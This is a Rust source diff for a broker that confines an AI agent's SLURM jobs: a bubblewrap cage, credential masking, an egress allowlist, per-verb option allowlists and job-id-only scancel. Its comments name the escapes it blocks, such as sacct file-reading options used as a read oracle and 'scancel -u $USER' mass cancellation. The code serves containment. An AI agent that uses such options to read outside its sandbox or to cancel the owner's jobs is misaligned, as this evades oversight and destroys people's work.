+    // rather than two parses of one string. Same construct-and-re-emit discipline as the
+    // rest of the submission surface. `interpret_cli` also canonicalises, so `-a 0-3`,
+    // `-a0-3` and a `#SBATCH --array=0-3` all arrive here spelled `--array=0-3`, and an
+    // `--array` value husk will not forward has already refused the whole submission.
+    //
+    // One consequence to know before adding a `requires`: `options` also holds the options
+    // husk FORCES (`--partition`, `--nodes=1`, `--export=ALL`, `--chdir`, `--output`,
+    // `--error`, `--open-mode`, `--account`). Requiring one of those is therefore satisfied
+    // by husk itself and never refuses - which is the right answer to the question this loop
+    // asks ("will SLURM receive it?") and the wrong table entry to write. `requires` must
+    // therefore name an option the REQUEST supplies.
+    //
+    // `RAB3-A1`: this used to say "the reference test is what catches that", and that was
+    // FALSE. `the_specifier_table_agrees_with_the_recorded_measurements` goes red on ANY
+    // table change, including a correct one, so its red is an instruction to update the
+    // reference row rather than a diagnosis. A reviewer wrote the edit an author making this
+    // mistake would actually write - `%N` given `requires = ["-N", "--nodes"]` AND the
+    // reference row updated in the same edit - and the suite was byte-identical to pristine
+    // at 299/2. The gate for `%N` would then have been a permanent no-op, satisfied by
+    // husk's own forced `--nodes=1`, leaving the run-time unset guard as the only defence:
+    // exactly the state this loop exists to fix for `%A`. A comment that names the wrong
+    // guardian is worse than none, because the next editor stops looking (`P12`).
+    //
+    // What actually catches it is `every_requires_name_is_an_option_the_request_supplies`
+    // in `settings.rs`, which asserts each `requires` name resolves in `sbatch::REGISTRY`
+    // and is `Class::Allowed`. Derived from the registry rather than restated (`P8`), and a
+    // test rather than a run-time check, because a `requires` naming a forced option is a
+    // table bug, not an input.
+    //
+    // Array jobs are unaffected: `--array` is `Class::Allowed`, production runs use it, and
+    // with it the variables ARE set and the guard was measured correct.
+    for (opt, given) in [("--output", &out_given), ("--error", &err_given)] {
+        for spec in settings::output_specifiers_needing_an_option(given) {
+            let names = spec.requires();
+            let emitted =
+                options.iter().any(|o| names.contains(&o.split('=').next().unwrap_or("")));
+            if !emitted {
+                let (c, var) = (spec.spec(), spec.variable());
+                let needs = names.last().copied().unwrap_or("that option");
+                return Decision::Reject(format!(
+                    "{opt}: {given:?} uses %{c}, and husk expands %{c} from {var} - which \
+                     SLURM sets only for a job submitted with {needs}. Without {needs} husk \
+                     would substitute nothing where SLURM substitutes something, so husk's \
+                     compute-node guard would check a different file from the one SLURM \
+                     opens - and the symlink and hard-link checks that protect --output \
+                     would run on a name that does not exist. Add {needs}, or use %j, which \
+                     is defined for every job."
+                ));
+            }
+        }
     }
 
     // Compute-side cage: derive the bwrap profile from the (trusted) resolved
     // sandbox.filesystem policy, hiding homes and re-exposing the human's carve-outs.
     // `cwd` is the forced --chdir dir, bound writable for job output.
-    let bwrap_args = fs.compute_bwrap_args(&cwd);
+    let bwrap_args = fs.compute_bwrap_args(&root);
+
+    // Does this job get an egress proxy at all? Only if the operator configured an
+    // allowlist. Resolved at SUBMIT time so the guard carries no policy of its own - the
+    // proxy re-reads the same files on the compute node, and this only decides whether to
+    // start one.
+    //
+    // This used to swallow the error and carry on with net_enabled=false, justified by "the
+    // proxy reports the error where an operator will see it". It does not: with the error
+    // swallowed here, the guard is generated with no network block at all and the proxy is
+    // never started, so there is nobody left to report anything. The generated script for a
+    // BROKEN allowlist and for NO allowlist were byte-identical.
+    //
+    // The operator's path to that state is the worst part. husk's own 403 for a blocked
+    // scheduler port told them to ask for the entry to be added; adding it makes the whole
+    // allowlist refuse to parse; and every job then silently loses egress, valid entries
+    // included, with no message anywhere. Refuse the submission instead and say which file.
+    // A broken allowlist means NO EGRESS, not a refused job: losing the allows makes the
+    // cage tighter, and refusing would deny the same network plus all the work that never
+    // needed it. What must not happen is what used to — the error swallowed with
+    // `.unwrap_or(false)` and the job running netless with nobody told. The script for a
+    // broken allowlist and for no allowlist were byte-identical.
+    //
+    // So the job is submitted, and the agent is TOLD, on the accepted path, where it will
+    // actually read it. `curl: (7) Failed to connect` is not a diagnosis.
+    let mut net_note = String::new();
+    let net_enabled = match crate::netallow::Allowlist::resolve(
+        &std::env::var_os("HOME").map(std::path::PathBuf::from).unwrap_or_default(),
+        project_dir,
+    ) {
+        Ok((a, _)) => !a.is_empty(),
+        Err(e) => {
+            net_note = format!(
+                "husk: this job has NO NETWORK. The network allowlist could not be read \
+                 ({e}), so husk fell back to its default of no egress. This is a \
+                 configuration problem, not a transient failure — retrying will not help, \
+                 and it is not something you can fix from in here. Tell the human."
+            );
+            false
+        }
+    };
+
+    // The agent's script travels as DATA, at a path husk chooses inside the write root —
+    // visible in the cage (the root is bound writable) and nowhere else that matters. The
+    // agent may rewrite it; that changes only its own payload, which it already controls,
+    // and crosses no boundary. What it can no longer do is author the bytes slurmstepd
+    // executes. `req.id` is already constrained to a safe path component by the spool.
+    let body_path = format!("{}/.husk-body-{}.sh", root.trim_end_matches('/'), req.id);
 
     Decision::Submit(Submission {
         options,
-        job_args: req.job_args.clone(),
-        wrapped_script: wrap_script(&req.script.body, &bwrap_args),
+        // The same warning the rejection carries, on the path that actually bit: a job
+        // that asked for the right partition and no --time is accepted, and only finds
+        // out about the limit from squeue afterwards.
+        // Both advisories ride the same channel, since both are things the agent learns
+        // only by being told: the wall limit it inherited, and whether it has a network.
+        // Three advisories now ride this channel, all of them things the agent learns only
+        // by being told: the wall limit it inherited, whether it has a network, and (A3)
+        // whether a line it wrote that LOOKS like a directive was actually read.
+        note: [net_note, time_note, account_note, sbatch::unread_directive_note(&req.script.body).unwrap_or_default()]
+            .into_iter()
+            .filter(|s| !s.is_empty())
+            .collect::<Vec<_>>()
+            .join("\n"),
+        wrapped_script: wrap_script(
+            &body_path,
+            &req.job_args,
+            &bwrap_args,
+            profile,
+            &root,
+            net_enabled,
+            &writable,
+            &out,
+            &err,
+        ),
+        body: req.script.body.clone(),
+        body_path,
     })
 }
 
+/// Where this broker and the srun stub live, derived from our own path
+/// (`<prefix>/bin/husk-slurm-broker` -> `<prefix>/lib/husk/srun-stub.py`, the layout
+/// install-husk.sh creates). Self-configuring: no new knob to set, and no agent input.
+///
+/// Both are only ever USED behind a runtime existence test in the guard, because the
+/// broker resolves them on the LOGIN node while the guard runs on a compute node — the
+/// same submit-side/run-side split that made the GPU binds `--dev-bind-try`.
+fn husk_paths() -> (String, String, String) {
+    let exe = std::env::current_exe().unwrap_or_default();
+    // TEST-ONLY seam, and deliberately the narrowest one that works: only the BROKER path,
+    // never the prefix the stub and socat are derived from. The guard now refuses to run a
+    // job whose step broker died at startup, so any harness that RUNS the guard needs a
+    // broker that stays alive — and under `cargo test` this path is the test binary, which
+    // exits immediately. Overriding the derivation instead would let a test silently prove
+    // a layout that install-husk.sh never creates.
+    #[cfg(test)]
+    let broker = tests::broker_path_override().unwrap_or_else(|| exe.to_string_lossy().to_string());
+    #[cfg(not(test))]
+    let broker = exe.to_string_lossy().to_string();
+    let prefix = exe.parent().and_then(|bin| bin.parent());
+    let stub = prefix
+        .map(|p| p.join("lib").join("husk").join("srun-stub.py"))
+        .unwrap_or_default()
+        .to_string_lossy()
+        .to_string();
+    // `install-husk.sh` builds socat into <prefix>/bin/socat when the system has none.
+    // That lives under the user's HOME, which the cage tmpfs-masks (HIDDEN_FLOOR), so it
+    // is invisible exactly where the egress relay needs it — the failure that made the
+    // first hardware run of the network feature come up empty. The guard binds it in.
+    let socat = prefix
+        .map(|p| p.join("bin").join("socat"))
+        .unwrap_or_default()
+        .to_string_lossy()
+        .to_string();
+    (broker, stub, socat)
+}
+
+/// Why a submission's partition was refused, naming every partition it MAY use.
+///
+/// AUTHORIZATION, NOT AVAILABILITY. An earlier wording said "Only --partition=X is permitted
+/// here"; a caged agent checked `sinfo`, saw `normal` up with 28 idle nodes, and read the
+/// contradiction as a possibly SPOOFED message - spending calls corroborating before it
+/// would act. Naming husk as the restricting party, and conceding that other partitions
+/// exist and may be idle, removes the contradiction instead of asking to be believed.
+///
+/// The rest keeps what that agent reported worked: constraint, remedy and rationale
+/// together, and byte-identical on every retry - which is what let it conclude "standing
+/// policy" rather than "transient failure" and stop retrying blind. The wall-limit note is
+/// attached only when husk can name ONE partition, because with a set it cannot know which
+/// limits will apply until the job chooses.
+fn partition_refusal(allowed: &[String], session: &Session, sets_time: bool) -> String {
+    let list = allowed.join(", ");
+    let remedy = if allowed.len() == 1 {
+        format!("resubmit with --partition={}", allowed[0])
+    } else {
+        format!("resubmit with --partition=<one of: {list}>")
+    };
+    let note = if allowed.len() == 1 {
+        time_limit_note(session, &allowed[0], sets_time)
+    } else {
+        String::new()
+    };
+    format!(
+        "husk submits brokered jobs only to these partitions: {list}; {remedy}. Other \
+         partitions may exist and be idle - this is husk's restriction on brokered jobs, not \
+         the cluster's availability. These are typically preemptible/low-priority, so \
+         checkpoint your work.{note}"
+    )
+}
+
+/// First occurrence of an option across the CLI and the `#SBATCH` body, in that order.
+fn pick_any(cli: &[String], directives: &[String], names: &[&str]) -> Option<String> {
+    sbatch::option_value(cli, names).or_else(|| sbatch::option_value(directives, names))
+}
+
+/// Default-deny the read-only verbs' option surface, PER VERB.
+///
+/// "Read-only" is a property of what the command does to the SCHEDULER. It says nothing
+/// about what its OPTIONS do to the filesystem, and these commands run OUTSIDE the cage
+/// with the human's full view. `sacct --completion --file=X` reads X. `sacct
+/// --batch-script` prints the stored script of any job on the account. Forwarding the
+/// agent's whole argv into them made husk a read oracle holding the door open.
+///
+/// **Per verb, not one shared list, and that is not tidiness.** The first version here used
+/// a single flat table and was WRONG, not merely coarse: `-p` is `--partition` in `squeue`
+/// and `sinfo` but `--parsable` in `sacct`, where it takes no value. A flat table that
+/// believes `-p` takes a value eats the next argument, so `sacct -p -j 123` loses its `-j`
+/// and then fails on a bare `123`. Same letter, different arity, different tool — an
+/// allowlist assembled from memory rather than from the tools, which is a denylist's
+/// mistake wearing the other hat.
+///
+/// Deliberately SMALL. A short list that is right beats a long one that is guessed, and the
+/// refusal names what this verb does accept, so an agent adapts in one step instead of
+/// probing. Widening it is an operator decision with a man page open.
+///
+/// **The table must be the INTERSECTION of the SLURM versions husk runs on, not the union.**
+/// Balfrin is 23.02.7 and Santis is 25.05.4, two major versions apart, so an option added
+/// after 23.02 works on one cluster and is an unrecognised-option error on the other. The
+/// older cluster is the floor. `query-parity-probe.sh` must therefore be run on BOTH, and it
+/// prints the version it tested so a green run cannot be mistaken for a general one.
+///
+/// **SchedMD publish versioned man pages, and they settle this without a cluster:**
+/// `https://slurm.schedmd.com/archive/slurm-<version>/<tool>.html` — e.g.
+/// `.../slurm-23.02.7/sacct.html`. Consult them whenever this table is touched. Reading
+/// them found four errors in the first draft that guessing had not: `--json`/`--yaml` are
+/// absent from `sstat`, `sprio` and `sshare` in 23.02, and `sshare`'s noheader is `-n`
+/// (`-h` is `--help` there). They also showed that several options gained OPTIONAL
+/// arguments by 25.05, which is why values are re-emitted as `--long=value`.
+///
+/// The parity probe still earns its keep after that: it checks the site's ACTUAL BUILD,
+/// and `--json`/`--yaml` are compile-time optional. Docs answer "does this version define
+/// it", the probe answers "did this site build it".
+/// `query-parity-probe` on a cluster should diff these tables against each tool's own
+/// `--help`, the same instrument shape `sbatch.directive_parity` already uses for `#SBATCH`.
+struct QuerySpec {
+    /// Options that consume a following value (or take one after `=`).
+    value: &'static [&'static str],
+    /// Options that stand alone.
+    flag: &'static [&'static str],
+}
+
+/// NO STREAMING OPTIONS. `-i/--iterate` makes `squeue` and `sinfo` print forever, and it is
+/// excluded from every verb deliberately, on two grounds that are independent of each other.
+///
+/// It cannot work: the spool protocol is request/response — the broker captures a command's
+/// output and returns it as one message — so there is nothing for an endless stream to be
+/// delivered to. And it costs: the broker is single-threaded, so a query that never returns
+/// occupies it until `run_query_cmd`'s watchdog kills it, and every other request, including
+/// `scancel`, waits behind it.
+///
+/// It also hung the parity probe, which is how it was found — 163 instant commands and one
+/// that never ends.
+fn query_spec(tool: &str) -> Option<QuerySpec> {
+    // Shared output-shaping flags that mean the same thing everywhere they exist.
+    Some(match tool {
+        "squeue" => QuerySpec {
+            value: &["-u", "--user", "-j", "--jobs", "-p", "--partition", "-A", "--account",
+                     "-t", "--states", "-n", "--name", "-q", "--qos", "-w", "--nodelist",
+                     "-M", "--clusters", "-S", "--sort", "-o", "--format"],
+            // `-s/--steps` takes an OPTIONAL argument, and SLURM's own man page warns the
+            // value must be attached with no space. husk has two arities, not three, so it
+            // offers the bare form only — a safe subset rather than a wrong guess.
+            flag: &["-a", "--all", "-r", "--array", "--me", "-s", "--steps",
+                    "-h", "--noheader", "-l", "--long", "--json", "--yaml"],
+        },
+        "sinfo" => QuerySpec {
+            value: &["-p", "--partition", "-n", "--nodes", "-t", "--states", "-M", "--clusters",
+                     "-S", "--sort", "-o", "--format"],
+            flag: &["-a", "--all", "-N", "--Node", "-s", "--summarize", "-d", "--dead",
+                    "-h", "--noheader", "-l", "--long", "--json", "--yaml"],
+        },
+        // `-p` here is --parsable, a FLAG, and `-r` is --partition. This is the verb the
+        // flat table got wrong.
+        "sacct" => QuerySpec {
+            value: &["-u", "--user", "-j", "--jobs", "-A", "--accounts", "-r", "--partition",
+                     "-s", "--state", "-S", "--starttime", "-E", "--endtime", "-N", "--nodelist",
+                     "-o", "--format", "-M", "--clusters", "-q", "--qos"],
+            flag: &["-a", "--allusers", "-X", "--allocations", "-D", "--duplicates",
+                    "-p", "--parsable", "-P", "--parsable2",
+                    "-n", "--noheader", "-l", "--long", "--json", "--yaml"],
+        },
+        "sstat" => QuerySpec {
+            value: &["-j", "--jobs", "-o", "--format"],
+            // No --json/--yaml here: sstat gained them after 23.02, and Balfrin is the floor.
+            flag: &["-a", "--allsteps", "-p", "--parsable", "-P", "--parsable2",
+                    "-n", "--noheader"],
+        },
+        "sprio" => QuerySpec {
+            value: &["-j", "--jobs", "-u", "--user", "-p", "--partition", "-o", "--format",
+                     "-M", "--clusters"],
+            // No --json/--yaml: not in 23.02's sprio.
+            flag: &["-n", "--norm", "-w", "--weights", "-h", "--noheader", "-l", "--long"],
+        },
+        "sshare" => QuerySpec {
+            value: &["-u", "--users", "-A", "--accounts", "-M", "--clusters", "-o", "--format"],
+            // sshare's noheader is -n, NOT -h (which is --help here), and it has no
+            // --json/--yaml in 23.02.
+            flag: &["-a", "--all", "-p", "--parsable", "-P", "--parsable2",
+                    "-n", "--noheader", "-l", "--long"],
+        },
+        // sreport's grammar is `sreport <type> <report> [opts]` — positional subcommands,
+        // which the rule below refuses on principle. Rather than special-case a parser for
+        // it, husk accepts only the shape it can vouch for and says so.
+        // sreport's grammar is `sreport <type> <report> [opts]` — positional subcommands,
+        // which the rule below refuses on principle. Empty rather than a plausible-looking
+        // flag list, so the refusal says husk does not broker this shape rather than
+        // offering options that cannot be used without the positionals anyway.
+        "sreport" => QuerySpec { value: &[], flag: &[] },
+        _ => return None,
+    })
+}
+
+/// Emit husk's query tables so a probe can check them against the real SLURM binaries.
+///
+/// The table is printed BY THE BROKER rather than restated in the probe script, for the same
+/// reason every other probe is driven from the trusted layer: a second copy is a copy that
+/// drifts, and the copy that drifts is the one that reports green.
+pub fn print_query_options() {
+    for tool in husk_slurm_broker::READONLY_SLURM {
+        if let Some(spec) = query_spec(tool) {
+            for o in spec.flag {
+                println!("{tool}\tflag\t{o}");
+            }
+            for o in spec.value {
+                println!("{tool}\tvalue\t{o}");
+            }
+        }
+    }
+}
+
+/// The `--long=value` spelling of a value option husk accepts.
+///
+/// Every value option is re-emitted this way, whatever the agent wrote, because a SEPARATED
+/// value is only unambiguous for options whose argument is REQUIRED. SLURM has been moving
+/// options to OPTIONAL arguments — `squeue -j` and `--json` are optional in 25.05 and were
+/// not in 23.02 — and for those, getopt only attaches a value written with `=` or jammed
+/// against the short form. `-j 123` then leaves 123 as a positional, which is a different
+/// command than the one the agent asked for and a difference that varies by cluster.
+///
+/// Emitting one canonical spelling removes the whole question, and it is the same
+/// construct-and-re-emit rule the submission surface follows: never forward the caller's
+/// spelling, emit our own.
+///
+/// The value lists are (short, long) pairs in order, which this relies on — asserted by
+/// `every_allowed_query_option_is_accepted`.
+fn long_form(spec: &QuerySpec, opt: &str) -> String {
+    if opt.starts_with("--") {
+        return opt.to_string();
+    }
+    match spec.value.iter().position(|o| *o == opt) {
+        Some(i) if i + 1 < spec.value.len() && spec.value[i + 1].starts_with("--") => {
+            spec.value[i + 1].to_string()
+        }
+        _ => opt.to_string(),
+    }
+}
+
+/// Check one read-only query's argv against its verb's table and RE-EMIT it.
+///
+/// The other half of `QuerySpec`'s doc block, which describes the table; this is what uses
+/// it. Nothing of the caller's spelling survives: a short option comes back as its long
+/// form (`long_form`), a value comes back as `--long=value`, and anything absent from the
+/// table is refused. That is the same construct-and-re-emit rule the submission surface
+/// follows, applied to the surface that runs OUTSIDE the cage with the human's full view.
+///
+/// Values are restricted to the punctuation SLURM's selectors and format strings use, with
+/// NO SLASH, so nothing that reaches these tools can name a path.
+fn vet_query_argv(tool: &str, argv: &[String]) -> Result<Vec<String>, String> {
+    let Some(spec) = query_spec(tool) else {
+        return Err(format!("husk does not broker {tool}"));
+    };
+    // A value that becomes an argument to another program: letters, digits, and the
+    // punctuation SLURM's selectors and format strings use. NO SLASH, so nothing that
+    // reaches these tools can be a path.
+    let ok_value = |v: &str| {
+        !v.is_empty()
+            && v.len() <= 256
+            // A SPACE is fine: these become separate argv elements via Command::args, not
+            // a shell string, so nothing re-splits them — and format strings need one
+            // (`-o "%i %T"`). What must not appear is a SLASH, because that is what turns
+            // a selector into a path.
+            && v.bytes().all(|b| b.is_ascii_alphanumeric() || b",._:+-=%@[] ".contains(&b))
+    };
+    let allowed = || {
+        let mut all: Vec<&str> =
+            spec.value.iter().chain(spec.flag.iter()).filter(|o| o.starts_with("--")).copied().collect();
+        all.sort_unstable();
+        all.join(" ")
+    };
+    let refuse = |what: &str| {
+        if spec.value.is_empty() && spec.flag.is_empty() {
+            return Err(format!(
+                "husk does not broker {tool}: its command line is built from positional \
+                 subcommands (`{tool} <type> <report> ...`), and husk only forwards options \
+                 it recognises. Use squeue, sacct or sshare for what you need, or ask your \
+                 operator."
+            ));
+        }
+        Err(format!(
+            "husk does not forward {what:?} to {tool}. Read-only queries are brokered with a \
+             fixed set of options, because {tool} runs outside the sandbox with your full \
+             filesystem access and some of its options read or write files. For {tool} husk \
+             accepts: {}. If you need another one, that is an operator decision.",
+            allowed()
+        ))
+    };
+
+    let mut out = vec![tool.to_string()];
+    let mut it = argv.iter();
+    while let Some(a) = it.next() {
+        if !a.starts_with('-') {
+            // A bare operand. None of these verbs need one, and a stray word is either a
+            // mistake or an attempt to pass a path positionally.
+            return refuse(a);
+        }
+        if let Some((name, value)) = a.split_once('=') {
+            if !spec.value.contains(&name) || !ok_value(value) {
+                return refuse(a);
+            }
+            out.push(format!("{}={value}", long_form(&spec, name)));
+            continue;
+        }
+        if spec.flag.contains(&a.as_str()) {
+            out.push(a.clone());
+            continue;
+        }
+        if spec.value.contains(&a.as_str()) {
+            let Some(v) = it.next() else {
+                return Err(format!("husk: {a} needs a value"));
+            };
+            if !ok_value(v) {
+                return refuse(v);
+            }
+            out.push(format!("{}={v}", long_form(&spec, a)));
+            continue;
+        }
+        return refuse(a);
+    }
+    Ok(out)
+}
+
+/// Validate a `scancel` invocation down to a list of job ids, or explain the refusal.
+///
+/// **Job ids only — every option is refused, and that is the whole security content.**
+/// `scancel` has a family of selector flags (`-u/--user`, `-A/--account`, `--state`,
+/// `--partition`, `-n/--name`, `--me`) that turn one command into a mass-cancel: an agent
+/// running `scancel -u $USER` would kill every job this human owns, including production
+/// runs husk never touched. A bare id cancels exactly one thing and is checkable against
+/// what husk submitted; a selector is evaluated by slurmctld against state husk cannot
+/// see, so it can never be checked. Same reasoning as the sbatch registry — allow the form
+/// that can be validated, refuse the form that has to be trusted.
+///
+/// Accepts `<jobid>`, `<jobid>_<arraytask>` and `<jobid>.<stepid>`, since those are how a
+/// user names a piece of a job they already own. The base id before `_` or `.` is what the
+/// broker checks ownership against.
+fn cancel_decision(argv: &[String]) -> Decision {
+    if argv.is_empty() {
+        return Decision::Reject(
+            "scancel needs at least one job id. husk cancels only jobs it submitted for \
+             this session, so selectors like -u/--user, --state or --me are refused: they \
+             are resolved by the scheduler against jobs husk cannot vouch for."
+                .to_string(),
+        );
+    }
+    let mut ids = Vec::new();
+    for a in argv {
+        if a.starts_with('-') {
+            return Decision::Reject(format!(
+                "scancel option {a:?} is not permitted here. husk brokers scancel only as \
+                 a list of job ids it submitted this session — a selector such as \
+                 -u/--user, -A/--account, --state or --me would cancel jobs husk never \
+                 submitted, including this account's production runs. Pass the job id."
+            ));
+        }
+        if !is_cancellable_id(a) {
+            return Decision::Reject(format!(
+                "{a:?} is not a job id. Pass ids as they appear in squeue: 4991406, or \
+                 4991406_3 for an array task, or 4991406.0 for a step."
+            ));
+        }
+        ids.push(a.clone());
+    }
+    Decision::Cancel(ids)
+}
+
+/// `<digits>` optionally followed by `_<digits>` (array task) or `.<digits>` (step).
+/// Restrictive on purpose: this string becomes an argument to the real `scancel`.
+fn is_cancellable_id(s: &str) -> bool {
+    let (base, rest) = match s.split_once(['_', '.']) {
+        None => (s, None),
+        Some((b, r)) => (b, Some(r)),
+    };
+    let numeric = |x: &str| !x.is_empty() && x.len() <= 20 && x.bytes().all(|b| b.is_ascii_digit());
+    numeric(base) && rest.map(numeric).unwrap_or(true)
+}
+
+/// The base job id a cancel target refers to — what ownership is checked against.
+pub fn cancel_base_id(s: &str) -> Option<u64> {
+    s.split(['_', '.']).next()?.parse().ok()
+}
+
+/// Files husk masked as credentials, read back out of the bwrap arguments it is about to
+/// emit — `--ro-bind /dev/null <path>`.
+///
+/// DERIVED from the mount table rather than passed alongside it, because a second list of
+/// "what we masked" is a second thing to drift from what was actually mounted. The mount
+/// table is the oracle; this just reads it.
+fn masked_credentials(bwrap_args: &[String]) -> Vec<String> {
+    // BOTH bind forms (N8). husk masks credential-named files with `--ro-bind /dev/null` and
+    // the auto-exec paths (`.git/hooks`, `.hg/hgrc`, …) with `--ro-bind-try /dev/null` — the
+    // `-try` variant tolerates an absent source. Matching only `--ro-bind` left every `-try`
+    // mask out of the banner, so the list claimed to name "what reads empty or refuses" while
+    // omitting paths that do exactly that. The mount table is the oracle; read ALL of it.
+    bwrap_args
+        .windows(3)
+        .filter(|w| (w[0] == "--ro-bind" || w[0] == "--ro-bind-try") && w[1] == "/dev/null")
+        .map(|w| w[2].clone())
+        .collect()
+}
+
+/// Announce the cage inside the job, and say what is writable.
+///
+/// The failure this exists for: a production ICON run died 22 times on `EROFS` and NOTHING
+/// in 390 lines of log attributed it to husk — only the kernel's bare "Read-only file
+/// system" ever surfaced, 17 times as ignorable-looking `rm:` chatter before the one line
+/// that mattered. An agent reasoning "can I write to my cwd? yes, so this is not a
+/// permissions problem" was led directly away from the answer (field report, 2026-07-31).
+///
+/// Confinement had worked and failed closed. The gap was purely diagnostic — and an
+/// unattributed denial does not merely slow an agent down, it invites confident wrong
+/// remediation: rewriting a runscript that was never broken, or blaming the filesystem.
+///
+/// A LIST, not a root. `sandbox.filesystem.allowWrite` adds paths beyond the project dir,
+/// so announcing one root would be a new way to mislead. The project dir is only special
+/// in that it is where husk was launched and where `.claude/` lives.
+fn cage_banner(writable: &[String], masked: &[String], net_enabled: bool) -> String {
+    let mut b = String::from(
+        "echo \"husk: compute cage active - the filesystem is READ-ONLY except:\" >&2\n",
+    );
+    for (i, p) in writable.iter().enumerate() {
+        let note = if i == 0 { "  (project dir: where husk was launched)" } else { "" };
+        b.push_str(&format!(
+            "echo \"husk:   {}{note}\" >&2\n",
+            settings::sh_quote(p).trim_matches('\'')
+        ));
+    }
+    // "Reads are unrestricted" was false, and false in the direction that matters. The cage
+    // tmpfs-masks /users, masks every configured denyRead, and binds /dev/null over every
+    // credential file — so a read CAN fail, and husk's most load-bearing announcement told
+    // the agent not to suspect husk when it did. The three failures do not even look alike:
+    // a masked directory is an empty directory, a masked credential file reads EACCES or
+    // empty depending on how it was bound, and a path under a hidden home is ENOENT. An
+    // agent that has been promised unrestricted reads diagnoses all three as "the file is
+    // not there" and goes looking for it somewhere else.
+    //
+    // Say what is actually true, and say the shape of the failure so it is recognisable.
+    b.push_str("echo \"husk: a write outside the list above fails with 'Read-only file\" >&2\n");
+    b.push_str("echo \"husk: system' - that is husk, not the filesystem.\" >&2\n");
+    b.push_str("echo \"husk: reads are mostly unrestricted, with three deliberate gaps:\" >&2\n");
+    b.push_str("echo \"husk:   home directories are hidden (they look EMPTY, not missing),\" >&2\n");
+    b.push_str("echo \"husk:   configured denyRead paths are hidden the same way, and\" >&2\n");
+    b.push_str("echo \"husk:   credential files read as empty or refuse with EACCES.\" >&2\n");
+    b.push_str("echo \"husk: If a file you expect is empty or absent, that may be husk\" >&2\n");
+    b.push_str("echo \"husk: hiding it rather than the file being gone. Copy what the job\" >&2\n");
+    b.push_str("echo \"husk: needs to the writable set above.\" >&2\n");
+    // Where husk's side of the story is. The job cannot read it (the cage masks $HOME) and
+    // that is the point - but whoever reads this output is on the login node, where it is
+    // an ordinary file. Naming it here is the difference between one place to look and a
+    // search.
+    // NAME the masked files. The banner already says credential files read as empty or
+    // EACCES, which tells an agent the SHAPE of the failure but not which file it will hit.
+    //
+    // `var3d.env` cost three failed 128-rank jobs and a misdiagnosis (LETKF, 2026-08-05/06):
+    // it is DACE's module-load script, husk masked it as a credential, and `source var3d.env`
+    // reported a bare `Permission denied` that named nobody. The scan is a heuristic and will
+    // be wrong again — so it must say what it did, at the one moment the job can still act on
+    // it. Capped, because a workdir full of keys should not bury the rest of the banner.
+    if !masked.is_empty() {
+        b.push_str(
+            "echo \"husk: masked (they read as empty or refuse - credential-named files and\" >&2\n",
+        );
+        b.push_str(
+            "echo \"husk: auto-exec files husk protects, e.g. .git/hooks):\" >&2\n",
+        );
+        for p in masked.iter().take(8) {
+            b.push_str(&format!(
+                "echo \"husk:   {}\" >&2\n",
+                settings::sh_quote(p).trim_matches('\'')
+            ));
+        }
+        if masked.len() > 8 {
+            b.push_str(&format!(
+                "echo \"husk:   ... and {} more\" >&2\n",
+                masked.len() - 8
+            ));
+        }
+        b.push_str(
+            "echo \"husk: this is a HEURISTIC on the file name and it can be wrong. If one of\" >&2\n",
+        );
+        b.push_str(
+            "echo \"husk: those is not a secret, rename it or declare the real ones in\" >&2\n",
+        );
+        b.push_str(
+            "echo \"husk: sandbox.credentials.files and they will be the only ones masked.\" >&2\n",
+        );
+    }
+    // WHAT THIS JOB ACTUALLY HOLDS.
+    //
+    // An agent that asked for 64 tasks and silently got 1 concluded "husk grants 2 CPUs per
+    // job" — right about the symptom, wrong about the cause, and it said why: husk was the
+    // only layer it could see, and it had no way to tell whether its request had been
+    // modified. That was a real husk bug (`#SBATCH` resource directives never reached SLURM,
+    // fixed in `da7a6e6`), but the reason it cost an hour rather than a minute is that
+    // nothing stated the allocation. Print it, so the next disagreement is one line of
+    // evidence instead of an inference about husk.
+    b.push_str(
+        "echo \"husk: this job HOLDS: nodes=${SLURM_JOB_NUM_NODES:-?} \
+         ntasks=${SLURM_NTASKS:-<unset>} cpus-per-task=${SLURM_CPUS_PER_TASK:-<unset>} \
+         cpus-on-node=${SLURM_CPUS_ON_NODE:-?}\" >&2\n",
+    );
+    // WHAT HUSK CONTROLS — and this list has to stay true, because the sentence after it
+    // sends the reader somewhere. It used to say husk forces "only --nodes=1, --export=ALL,
+    // --open-mode=append and the output paths" and that a mismatch is therefore upstream.
+    // That became false when --partition, --account and --uenv gained operator allowlists:
+    // husk resolves each against a set and re-emits its OWN copy. On a site with one
+    // configured account every job silently carries it while the banner promised husk was
+    // not involved — the banner telling an agent to look in the wrong place, which is the
+    // one thing it exists to prevent (`P13`).
+    b.push_str(
+        "echo \"husk: if that is not what you asked for: husk forces --nodes=1, --export=ALL,\" >&2\n",
+    );
+    b.push_str(
+        "echo \"husk: --open-mode=append and the output paths, and resolves --partition,\" >&2\n",
+    );
+    b.push_str(
+        "echo \"husk: --account and --uenv against your operator's allowlists. Anything else\" >&2\n",
+    );
+    b.push_str(
+        "echo \"husk: is passed through, so a mismatch there is upstream of husk.\" >&2\n",
+    );
+    // WHAT IT ACTUALLY GOT, read at run time rather than from what husk asked for — the same
+    // choice the HOLDS line makes, and for the same reason: intent and reality can differ and
+    // the useful one is reality.
+    //
+    // The uenv comes from the PLUGIN'S OWN VARIABLES, not from /proc/mounts. The first version
+    // scanned squashfs mounts, which cannot answer the question being asked: a Balfrin compute
+    // node carries `/.rootfs_lower_ro` and three `/mch-environment/*` images that belong to the
+    // node, not the job, so the line read
+    // `uenv=/.rootfs_lower_ro /mch-environment/v6 v7 v8 /user-environment` and implied the job
+    // was running in four environments. Excluding `/snap` had fixed the laptop's version of the
+    // same mistake and not the cluster's. `UENV_MOUNT_LIST` and `UENV_VIEW` are set by the uenv
+    // plugin for THIS job, which is the only source that distinguishes it from the furniture.
+    b.push_str(
+        "echo \"husk: this job RUNS AS: partition=${SLURM_JOB_PARTITION:-?} \
+         account=${SLURM_JOB_ACCOUNT:-<none>}\" >&2\n",
+    );
+    b.push_str(concat!(
+        "echo \"husk:   uenv=${UENV_MOUNT_LIST:-<none>}",
+        " view=${UENV_VIEW:-<none>}\" >&2\n"
+    ));
+    // NETWORK: name the exact string the failure will wear.
+    //
+    // The proxy's refusal is well written and almost never seen: it answers a CONNECT, and
+    // clients discard a CONNECT response body. What the agent actually gets is
+    // `curl: (56) CONNECT tunnel failed, response 403` — no husk, no host, no remedy. The
+    // status line carries a short form now, but the cheaper fix is the one this banner
+    // already uses for writes: say in advance what husk's refusal will LOOK like, so an
+    // unattributed error becomes attributable retroactively.
+    //
+    // The allowlist itself is deliberately NOT printed here. The proxy re-reads it on the
